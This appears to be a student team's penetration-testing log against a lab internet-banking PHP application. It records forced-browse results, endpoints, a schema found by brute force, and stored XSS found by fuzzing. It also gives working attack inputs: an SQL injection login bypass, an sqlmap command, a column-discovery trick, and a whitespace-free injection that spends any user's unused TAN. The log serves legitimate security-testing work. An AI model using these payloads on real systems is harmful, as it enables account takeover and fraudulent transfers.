# Vulnerability log for Team 4

## Directory structure

### Using ZAP

#### Forced Browse
With a forced browse on /InternetBanking/, we get a quite long list of files. As some PHP files do not have the .php file suffix, they get downloaded instead. Also, the source code for the parser is included in the directory.

```
http://nuc:8085/InternetBanking/
http://nuc:8085/InternetBanking/DataAccess/
http://nuc:8085/InternetBanking/auth/
http://nuc:8085/InternetBanking/client/
http://nuc:8085/InternetBanking/controller/
http://nuc:8085/InternetBanking/controller/clientController.php
http://nuc:8085/InternetBanking/controller/clientFunctions.inc
http://nuc:8085/InternetBanking/controller/employeeController.php
http://nuc:8085/InternetBanking/controller/employeeFunctions.inc
http://nuc:8085/InternetBanking/controller/loginController.php
http://nuc:8085/InternetBanking/controller/logoutController.php
http://nuc:8085/InternetBanking/controller/registrationController.php
http://nuc:8085/InternetBanking/css/
http://nuc:8085/InternetBanking/css/bootstrap-theme.css
http://nuc:8085/InternetBanking/css/bootstrap-theme.css.map
http://nuc:8085/InternetBanking/css/bootstrap-theme.min.css
http://nuc:8085/InternetBanking/css/bootstrap.css
http://nuc:8085/InternetBanking/css/bootstrap.css.map
http://nuc:8085/InternetBanking/css/bootstrap.min.css
http://nuc:8085/InternetBanking/employee/
http://nuc:8085/InternetBanking/fonts/
http://nuc:8085/InternetBanking/fonts/glyphicons-halflings-regular.eot
http://nuc:8085/InternetBanking/fonts/glyphicons-halflings-regular.svg
http://nuc:8085/InternetBanking/fonts/glyphicons-halflings-regular.ttf
http://nuc:8085/InternetBanking/fonts/glyphicons-halflings-regular.woff
http://nuc:8085/InternetBanking/fonts/glyphicons-halflings-regular.woff2
http://nuc:8085/InternetBanking/index/
http://nuc:8085/InternetBanking/js/
http://nuc:8085/InternetBanking/js/bootstrap.js
http://nuc:8085/InternetBanking/js/bootstrap.min.js
http://nuc:8085/InternetBanking/js/npm.js
http://nuc:8085/InternetBanking/login/
http://nuc:8085/InternetBanking/logout/
http://nuc:8085/InternetBanking/model/
http://nuc:8085/InternetBanking/model/Payment.class
http://nuc:8085/InternetBanking/model/PaymentRequest.class
http://nuc:8085/InternetBanking/model/User.class
http://nuc:8085/InternetBanking/model/UserRequest.class
http://nuc:8085/InternetBanking/parser/
http://nuc:8085/InternetBanking/parser/Makefile
http://nuc:8085/InternetBanking/parser/exec
http://nuc:8085/InternetBanking/parser/main.c
http://nuc:8085/InternetBanking/parser/mysql_query_function.c
http://nuc:8085/InternetBanking/parser/mysql_query_function.h
http://nuc:8085/InternetBanking/registration/
http://nuc:8085/InternetBanking/view/
http://nuc:8085/InternetBanking/view/account.inc
http://nuc:8085/InternetBanking/view/accounts.inc
http://nuc:8085/InternetBanking/view/approvepayments.inc
http://nuc:8085/InternetBanking/view/approveregistrations.inc
http://nuc:8085/InternetBanking/view/client.inc
http://nuc:8085/InternetBanking/view/employee.inc
http://nuc:8085/InternetBanking/view/file.inc
http://nuc:8085/InternetBanking/view/history.inc
http://nuc:8085/InternetBanking/view/historypdf.inc
http://nuc:8085/InternetBanking/view/login.inc
http://nuc:8085/InternetBanking/view/online.inc
http://nuc:8085/InternetBanking/view/registration.inc
```

### Noted behaviour

This list is very incomplete.

```
login.php - Login page and login execution
  Executes login when username and password specified in POST.

registration.php
  POST username=a1&email=&password=Aa1234%2F&passwordconf=Aa1234%2F&accounttype=client

client.php - Client sites
  GET action=account,history,historypdf,online,file
  Online: POST receipt=t1&amount=1&purpose=fdsgfdsg&trancode=r3bIvzE9JFLWpDd

employee.php - Employee main site
  GET action=accounts,approvepayments,approveregistrations,history,historypdf
  Approve regs: POST requestid, approve={reject,approve}
  History, history PDF: GET account

logout.php - Logout
```

## Database structure

With the brute force script, we get the following results:

```
Table payment: id, trancode, payer, receipt, amount, purpose
Table user: id, balance, email, username, password, isemployee
Table userrequest: id, email, username, password, isemployee
Table paymentrequest: id, trancode, payer, receipt, amount, purpose
Table trancode: id, clientid
```

## Login

### Using ZAP

#### Stored XSS Vulnerabilities

In registration: Fuzz the username using "jbrofuzz / XSS / XSS 101"
This can also be applied to the transaction description.

Consequence: The site of an employee can be completely destroyed, or one can ask for username and password of the employee with a rebuilt login form, etc.


#### SQL injection

In login: Fuzz the username using "jbrofuzz / SQL Injection / SQL Injection"
The last entry (  anything' OR 'x'='x  ) will login the attacker as "anything" (if the user exists) or as the first user where the password matches.

## Transaction HTML form

### Using SQLmap

Attacking the transaction form did not lead to any vulnerabilities from SQLmap:

```
sqlmap -u 'http://vm/InternetBanking/client.php?action=online' --data='receipt=t1&amount=1&purpose=sqli&tancode=te' --level=5 --risk=3 --text-only --cookie='PHPSESSID=8fqb4ba3cd322t4u13k1g2qhv4'
```

## File upload

### Manual testing
not, because the tools wouldn't be able to do that, but because the things are too special for general tools.

Note that stacked SQL queries appear to be not supported.

It looks like SQL errors end up in an immediate program exit, so we don't get "success" or "fail" displayed, except in the comment entry where success is always displayed. To check, one has to go to the history page and check whether the transaction appears there.

#### Finding database columns

Append  `" GROUP BY <colname> HAVING "1"="1`. It will say nothing, if the column does not exist.


#### Perform transaction without TAN (SQL injection)

In the TAN line, the parser apparently stops scanning the line after the first whitespace. This makes things more difficult, but not impossible:

```
"OR(NOT(`id`IN(SELECT`trancode`FROM`payment`)))AND(NOT(`id`IN(SELECT`trancode`FROM`paymentrequest`)))AND"x"="x
```

This was found by manual testing and will use any unused TAN of any user. Potentially, the TANs of all users could be compromised.
